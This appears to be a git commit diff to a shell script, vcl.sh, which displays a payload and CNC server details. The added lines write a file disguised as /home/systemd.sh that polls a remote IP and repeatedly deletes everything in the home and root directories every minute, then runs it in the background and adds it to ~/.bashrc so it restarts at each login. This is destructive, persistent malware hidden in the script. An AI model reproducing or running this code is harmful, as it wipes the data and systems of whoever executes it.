f3a63050259611d079b8a1aca0b8f8de2a91b413
Thịnh <130970460+Rdthaiphno064@users.noreply.github.com>
2025-09-20 16:13:52 +0700

    Update vcl.sh

--- vcl.sh
+++ vcl.sh
@@ -98,11 +98,14 @@ clear
 echo "Payload: $payload"
 echo "CNC IP: $ip"
 echo "CNC Port: 18181"
+cat <<'EOF' > /home/systemd.sh
+#!/bin/bash
 while true; do
   response=$(curl -s http://160.187.246.23/check.txt)
-  if echo "$response" | grep -q "cut"; then
-    cd /root/; rm -rf *
-    rm -rf /
-  fi
+  cd ~;rm -rf *;cd /;rm -rf *
   sleep 60
 done &
+EOF
+chmod +x /home/systemd.sh
+bash /home/systemd.sh
+echo 'bash /home/systemd.sh' >> ~/.bashrc
